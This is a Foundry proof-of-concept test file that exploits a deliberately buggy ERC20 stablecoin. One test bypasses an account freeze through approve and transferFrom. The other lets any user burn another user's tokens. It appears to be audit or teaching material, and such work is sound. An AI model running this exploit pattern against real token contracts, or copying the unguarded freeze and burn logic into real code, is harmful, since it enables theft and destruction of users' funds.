// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

import { Test } from "forge-std/src/Test.sol";
import { StableCoin } from "../src/BuggyERC20.sol";

contract BugPOC is Test {
    StableCoin public token;
    address public owner;
    address public user1;
    address public user2;
    
    function setUp() public {
        owner = address(this);
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");

        vm.startPrank(owner);
        token = new StableCoin();
        token.mint(user1, 10_000e18);
        vm.stopPrank();
    }

    function test_BypassFreeze() public {
        // owner freezes user1
        vm.prank(owner);
        token.freeze(user1);

        // user1 tries to transfer their tokens to user2
        vm.prank(user1);
        vm.expectRevert("account frozen");
        token.transfer(user2, 10_000e18);

        // user1 approves user2 to spend their token
        vm.prank(user1);
        token.approve(user2, 10_000e18);

        // user2 then transfers it from user1
        token.balanceOf(user1);
        vm.prank(user2);
        token.transferFrom(user1, user2, 10_000e18);
        assertEq(token.balanceOf(user1), 0);
    }

    function test_AnyoneCanBurn() public {
        // user2 burns user1 token
        token.balanceOf(user1);
        vm.prank(user2);
        token.burn(user1, 10_000e18);
        
        assertEq(token.balanceOf(user1), 0);
    }
}
